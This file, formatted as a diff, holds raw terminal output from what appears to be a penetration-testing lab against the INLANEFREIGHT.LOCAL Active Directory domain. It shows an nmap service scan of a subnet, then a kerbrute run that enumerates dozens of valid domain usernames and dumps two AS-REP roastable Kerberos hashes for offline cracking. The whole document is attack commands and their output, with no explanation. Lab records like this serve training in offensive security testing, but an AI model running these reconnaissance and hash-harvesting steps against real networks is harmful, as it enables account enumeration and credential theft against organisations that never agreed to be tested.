@@ -1,0 +1,150 @@
+nmap -sV 172.16.5.0/24
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-06-20 14:17 EDT
+Stats: 0:01:01 elapsed; 253 hosts completed (3 up), 3 undergoing Service Scan
+Service scan Timing: About 95.45% done; ETC: 14:18 (0:00:02 remaining)
+Nmap scan report for inlanefreight.local (172.16.5.5)
+Host is up (0.037s latency).
+Not shown: 988 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-20 18:17:29Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 172.16.5.130
+Host is up (0.045s latency).
+Not shown: 992 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+808/tcp   open  ccproxy-http?
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+16001/tcp open  mc-nmf        .NET Message Framing
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 172.16.5.225
+Host is up (0.050s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+3389/tcp open  ms-wbt-server xrdp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 256 IP addresses (3 hosts up) scanned in 98.87 seconds
+
+
+└──╼ $./kerbrute_linux_386 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 xato-net-10-million-usernames.txt -o valid_ad_users
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 06/20/25 - Ronnie Flathers @ropnop
+
+2025/06/20 14:40:17 >  Using KDC(s):
+2025/06/20 14:40:17 >  	172.16.5.5:88
+
+2025/06/20 14:40:17 >  [+] VALID USERNAME:	 morris@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:17 >  [+] VALID USERNAME:	 administrator@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:17 >  [+] VALID USERNAME:	 jjones@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:18 >  [+] VALID USERNAME:	 sbrown@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:18 >  [+] VALID USERNAME:	 Morris@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:18 >  [+] VALID USERNAME:	 dlewis@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:18 >  [+] VALID USERNAME:	 bdavis@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:18 >  [+] VALID USERNAME:	 jwilson@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:18 >  [+] VALID USERNAME:	 tjohnson@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:19 >  [+] VALID USERNAME:	 Administrator@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:19 >  [+] VALID USERNAME:	 plover@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:19 >  [+] VALID USERNAME:	 gdavis@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:19 >  [+] Mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$Mmorgan@INLANEFREIGHT.LOCAL:d78e6ac55e884240b1c2e0e92e51534a$281ba211e01929a2e3400c47b58caa80ae5e99ba827ffd6ec6f27a038a7af605657602b5db4ab581e9bb9d995d5fbb1edbaf84644302ece8e68308715c09b32f2b45abe54ccd157a16339a21f2188d51e3da97d1a83931c64de8a7b097e8c3cc137bb31f2ef71b391425a757149c319c115c7b3269b80b89279f07ec491c9990a6b8f003b1d1c760d8827e47207a7bda4df7867c16a4491c798034f7f330553d084872c2dd38be5febd18b28d6e7a3873be8e983cf2401d99a1b86e49a37c623b3c6d175f28a80c13c95f544402cad0a1c263a5c59515d93f1005b84959b600f0dcb2c7fda173d16125e18bda65d984a28a50596f722eba43c9e351ab2504948dbb3bbb4620922d33e8b
+2025/06/20 14:40:19 >  [+] VALID USERNAME:	 Mmorgan@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:20 >  [+] VALID USERNAME:	 youngs@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:20 >  [+] VALID USERNAME:	 MORRIS@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:23 >  [+] VALID USERNAME:	 sinman@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:23 >  [+] VALID USERNAME:	 sannie@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:23 >  [+] VALID USERNAME:	 njohnson@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:24 >  [+] VALID USERNAME:	 jwallace@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:27 >  [+] VALID USERNAME:	 minman@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:32 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:eefcab4a93c4d020f9e22eab18e90141$c39450ef95473262193c1419d7fc4143fe7c0beac74a948ccc934b9fa92c8114c9a7961e8881fde424958ec04edd52d07efcf441b7a0bb26779060ba12a85a915b8e449681a77910350ca41347627556103bc4554668d774e69e3e89c3003db305223fe273ae9303b00c905e63cfdf084e818a61b064513b28d3698a598b72d62e23291359938622a3da701bf66ec285ec0315e471557f9ac37f1759d8f8458cdf435ec3ce36347197849b5bcf9a784b07f9aa37e42d409739b47a1bf01f51ad72727b08a10955e8862c74594c8f4b735d9dffa05de0273b2500131adfbdc2ca64f03c62b90e05d3731fcab84a14dd4f611acb3c7204473b9d8d386079f33d21e8315616ef8147c148a5
+2025/06/20 14:40:32 >  [+] VALID USERNAME:	 mmorgan@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:32 >  [+] VALID USERNAME:	 mharrison@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:32 >  [+] VALID USERNAME:	 jmay@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:34 >  [+] VALID USERNAME:	 dpayne@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:35 >  [+] VALID USERNAME:	 Marder@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:40 >  [+] VALID USERNAME:	 logistics@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:42 >  [+] VALID USERNAME:	 gratch@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:43 >  [+] VALID USERNAME:	 frontdesk@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:46 >  [+] VALID USERNAME:	 Plover@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:46 >  [+] VALID USERNAME:	 JJones@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:49 >  [+] VALID USERNAME:	 therage@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:50 >  [+] VALID USERNAME:	 theark@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:51 >  [+] VALID USERNAME:	 smilley@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:52 >  [+] VALID USERNAME:	 rramirez@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:56 >  [+] VALID USERNAME:	 mrichardson@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:56 >  [+] VALID USERNAME:	 mlowe@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:56 >  [+] VALID USERNAME:	 mithat@INLANEFREIGHT.LOCAL
+2025/06/20 14:40:57 >  [+] VALID USERNAME:	 mandis@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:05 >  [+] VALID USERNAME:	 dbranch@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:10 >  [+] VALID USERNAME:	 adfs@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:10 >  [+] VALID USERNAME:	 abless@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:12 >  [+] VALID USERNAME:	 JJONES@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:15 >  [+] VALID USERNAME:	 younts@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:16 >  [+] VALID USERNAME:	 wilken@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:23 >  [+] VALID USERNAME:	 tgarcia@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:25 >  [+] VALID USERNAME:	 suppen@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:25 >  [+] VALID USERNAME:	 strent@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:30 >  [+] VALID USERNAME:	 sherack@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:33 >  [+] VALID USERNAME:	 sammat@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:40 >  [+] VALID USERNAME:	 posion@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:50 >  [+] VALID USERNAME:	 mmullins@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:51 >  [+] VALID USERNAME:	 mhicks@INLANEFREIGHT.LOCAL
+2025/06/20 14:41:54 >  [+] VALID USERNAME:	 mannew@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:13 >  [+] VALID USERNAME:	 hathat@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:13 >  [+] VALID USERNAME:	 hasked@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:32 >  [+] VALID USERNAME:	 csteele@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:42 >  [+] VALID USERNAME:	 bessed@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:43 >  [+] VALID USERNAME:	 beader@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:45 >  [+] VALID USERNAME:	 avazquez@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:45 >  [+] VALID USERNAME:	 aunder@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:49 >  [+] VALID USERNAME:	 adunn@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:53 >  [+] VALID USERNAME:	 Sannie@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:53 >  [+] VALID USERNAME:	 SBROWN@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:55 >  [+] VALID USERNAME:	 PLOVER@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:56 >  [+] VALID USERNAME:	 Mandis@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:58 >  [+] VALID USERNAME:	 Jwallace@INLANEFREIGHT.LOCAL
+2025/06/20 14:42:58 >  [+] VALID USERNAME:	 JWilson@INLANEFREIGHT.LOCAL
+2025/06/20 14:43:00 >  [+] VALID USERNAME:	 GDAVIS@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:00 >  [+] VALID USERNAME:	 wrouse@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:05 >  [+] VALID USERNAME:	 witold@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:05 >  [+] VALID USERNAME:	 witing@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:05 >  [+] VALID USERNAME:	 withey@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:09 >  [+] VALID USERNAME:	 whouse@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:14 >  [+] VALID USERNAME:	 wdillard@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:40 >  [+] VALID USERNAME:	 vister@INLANEFREIGHT.LOCAL
+2025/06/20 14:44:56 >  [+] VALID USERNAME:	 venind@INLANEFREIGHT.LOCAL
+2025/06/20 14:45:47 >  [+] VALID USERNAME:	 tremen@INLANEFREIGHT.LOCAL
+2025/06/20 14:45:49 >  [+] VALID USERNAME:	 tramere@INLANEFREIGHT.LOCAL
+2025/06/20 14:45:54 >  [+] VALID USERNAME:	 toplad@INLANEFREIGHT.LOCAL
+2025/06/20 14:46:21 >  [+] VALID USERNAME:	 theyear@INLANEFREIGHT.LOCAL
+2025/06/20 14:46:22 >  [+] VALID USERNAME:	 thereves@INLANEFREIGHT.LOCAL
+2025/06/20 14:46:23 >  [+] VALID USERNAME:	 themall@INLANEFREIGHT.LOCAL
+2025/06/20 14:47:02 >  [+] VALID USERNAME:	 syncron@INLANEFREIGHT.LOCAL
+2025/06/20 14:47:24 >  [+] VALID USERNAME:	 suffell@INLANEFREIGHT.LOCAL
+2025/06/20 14:47:48 >  [+] VALID USERNAME:	 squished@INLANEFREIGHT.LOCAL
